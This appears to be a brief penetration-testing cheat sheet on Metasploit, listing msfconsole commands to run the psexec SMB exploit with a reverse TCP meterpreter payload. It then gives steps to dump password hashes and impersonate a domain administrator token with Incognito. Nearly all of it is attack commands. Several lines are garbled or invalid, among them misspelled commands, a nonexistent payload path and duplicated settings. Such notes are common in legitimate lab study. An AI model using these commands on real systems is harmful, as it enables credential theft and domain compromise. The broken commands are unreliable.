Token Imperonstation with Incognito on Metasploit
*****************************************************

Metasploit pre-shell
#########################

.. code-block:: console

        msfconsole
        use exploit/windows/smb/psexec
        set rhosts 192.168.57.141
        set rhost victimIP
        set smbdomain marvel.local
        set subdomain domain
        set smbuser fcastle
        set smbuser username
        set target 2
        set paylaod windows/x65/meterpreter/reverse/tcp
        set lhost wlan0
        run

Metasploit shell
###################

.. code-block:: console

        hashdump -> dumps machine hashes
        getuid -> see which user you are
        sysinfo -> get system information
        load incognito
        list_tokens -u
        impersonate_token marvel\\administrator
        impersonate_toekn domain\\Administrator
        shell
